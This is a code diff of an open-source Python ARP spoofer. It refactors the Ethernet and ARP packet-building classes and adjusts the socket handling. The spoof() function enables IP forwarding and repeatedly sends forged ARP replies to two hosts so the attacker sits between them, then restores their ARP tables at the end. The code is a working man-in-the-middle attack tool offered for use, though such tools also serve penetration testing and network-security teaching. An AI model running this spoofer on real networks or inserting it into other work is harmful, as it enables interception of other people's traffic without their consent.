@@ -1,5 +1,18 @@
 #!/usr/bin/env python3
 
+import argparse
+import binascii
+import re
+import socket
+import struct
+import sys
+import time
+
+
+__author__ = "pacmanator"
+__email__ = "mrpacmanator@gmail.com"
+__version__ = "v1.0"
+
 """
 An ARP spoofer implementation in pure python.
 Copyright (C) 2017-2018  pacmanator
@@ -18,15 +31,6 @@ You should have received a copy of the GNU General Public License
 along with this program.  If not, see https://www.gnu.org/licenses/.
 """
 
-import argparse
-import binascii
-import re
-import socket
-import struct
-import sys
-import time
-
-
 class EtherEncode(object):
     """ Creates an Ethernet frame. """
 
@@ -41,15 +45,13 @@ class EtherEncode(object):
         self._src = self._setMAC(src)
         self._proto = struct.pack("!H", proto)
 
+
     def _setMAC(self, mac):
         """
             Returns a byte encoded MAC Address if it's a string, otherwise sets its value.
         """
         return self.encodeMAC(mac) if (mac is not None) and (not isinstance(mac, bytes)) else mac
 
-    def craftPacket(self):
-        """ Creates an Ethernet frame. """
-        return self._dst + self._src + self._proto
 
     def isValidMAC(self, mac):
         """
@@ -66,6 +68,7 @@ class EtherEncode(object):
 
         return False
 
+
     def encodeMAC(self, mac):
         """ Transforms a string MAC Address to it's bytes form. """
         if not self.isValidMAC(mac):
@@ -74,6 +77,28 @@ class EtherEncode(object):
 
         # Returns a 'bytes' MAC address (\xff\xff\xff\xff\xff\xff)
         return binascii.unhexlify(mac.replace(":", ""))
+
+
+    def __str__(self):
+        """
+            Return a string representation of the Ethernet packet.
+        """
+        return "Dst MAC: {0} Src MAC: {1} Proto: {2}".format(self._dst, self._src, self._proto)
+
+
+    def __bytes__(self):
+        """
+            Returns a bytes representation of the packet.
+        """
+        return self._dst + self._src + self._proto
+
+
+    def __add__(self, other):
+        """
+            Adds this packet bytes with the bytes representation of another packet.
+            @param other: The other packet.
+        """
+        return bytes(self) + bytes(other)
 
 
 class ARPEncode(EtherEncode):
@@ -105,9 +130,27 @@ class ARPEncode(EtherEncode):
         self._sIP = socket.inet_aton(sIP)
         self._dIP = socket.inet_aton(dIP)
 
-    def craftPacket(self):
-        """ Creates the ARP packet section. """
-        # Create the first half of the ARP packet.
+
+    def __str__(self):
+        """
+            Return a string representation of an ARP packet.
+        """
+        firstHalf = "hwType: {0} pType: {1} hwSize: {2} pSize: {3} opcode: {4}".format(self._hwtype,
+                                                                                        self._pType,
+                                                                                        self._hwsize,
+                                                                                        self._psize,
+                                                                                        self._opcode)
+        secondHalf = "\nsMAC: {0} dMAC: {1} sIP: {2} dIP: {3}\n".format(self._sMAC,
+                                                                         self._dMAC,
+                                                                         self._sIP,
+                                                                         self._dIP)
+        return "{0}{1}".format(firstHalf, secondHalf)
+
+
+    def __bytes__(self):
+        """
+            Return a bytes representaion of the packet.
+        """
         up = struct.pack("!HHBBH", self._hwtype, self._pType, self._hwsize, self._psize, self._opcode)
         return up + self._sMAC + self._sIP + self._dMAC + self._dIP
 
@@ -142,12 +185,12 @@ def getHostMac(targetIP, iface, srcIP, sock=None):
     """
     # Ethernet broadcast packet.
     eth = EtherEncode(dst="ff:ff:ff:ff:ff:ff", src=getInterfaceMAC(iface))
-    ethPacket = eth.craftPacket()
+    ethPacket = eth
 
     # Encode ARP broadcast MAC address.
     dstMAC = eth.encodeMAC("00:00:00:00:00:00")
     # Create ARP packet.
-    arpPacket = ARPEncode(eth._src, srcIP, dstMAC, targetIP).craftPacket()
+    arpPacket = ARPEncode(eth._src, srcIP, dstMAC, targetIP)
 
     packet = ethPacket + arpPacket
 
@@ -158,7 +201,7 @@ def getHostMac(targetIP, iface, srcIP, sock=None):
 
         while True:
             sock.send(packet)
-            recv = sock.recv(1500)
+            recv = sock.recv(1024)
 
             # Check if the ARP opcode is a 'reply' type and if it matches with the provided IP address.
             if (recv[20:22] == b"\x00\x02") and (recv[0x1c:0x20] == socket.inet_aton(targetIP)):
@@ -215,9 +258,9 @@ def restoreARP(srcMAC, srcIP, targetMAC, targetIP, sock=None):
     print("\033[1;36m[*]\033[0;0m Restoring ARP.")
     try:
         changeIPForwarding("0")
-        ethernetPacket = EtherEncode(dst=targetMAC, src=srcMAC).craftPacket()
+        ethernetPacket = EtherEncode(dst=targetMAC, src=srcMAC)
 
-        arpPacket = ARPEncode(srcMAC, srcIP, targetMAC, targetIP, opcode=0x0002).craftPacket()
+        arpPacket = ARPEncode(srcMAC, srcIP, targetMAC, targetIP, opcode=0x0002)
         packet = ethernetPacket + arpPacket
 
         sock.send(packet)
@@ -241,8 +284,9 @@ def spoof(iface, target1IP, srcIP, target2IP, intervals=30):
     try:
         changeIPForwarding("1")
         sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-
-        sock.bind((iface, 0x0806))
+        
+        # Bind the socket to the provided interface.
+        sock.bind((iface, 0x03))
 
         srcMAC = getInterfaceMAC(iface)
 
@@ -253,13 +297,13 @@ def spoof(iface, target1IP, srcIP, target2IP, intervals=30):
         target2MAC = getHostMac(target2IP, iface, srcIP, sock)
 
         # Target 1 Packet.
-        ethernetPacket1 = EtherEncode(dst=target1MAC, src=srcMAC).craftPacket()
-        arpPacket1 = ARPEncode(srcMAC, target2IP, target1MAC, target1IP, opcode=0x0002).craftPacket()
+        ethernetPacket1 = EtherEncode(dst=target1MAC, src=srcMAC)
+        arpPacket1 = ARPEncode(srcMAC, target2IP, target1MAC, target1IP, opcode=0x0002)
         packet1 = ethernetPacket1 + arpPacket1
 
         # Target 2 packet.
-        ethernetPacket2 = EtherEncode(dst=target2MAC, src=srcMAC).craftPacket()
-        arpPacket2 = ARPEncode(srcMAC, target1IP, target2MAC, target2IP, opcode=0x0002).craftPacket()
+        ethernetPacket2 = EtherEncode(dst=target2MAC, src=srcMAC)
+        arpPacket2 = ARPEncode(srcMAC, target1IP, target2MAC, target2IP, opcode=0x0002)
         packet2 = ethernetPacket2 + arpPacket2
 
         while True:
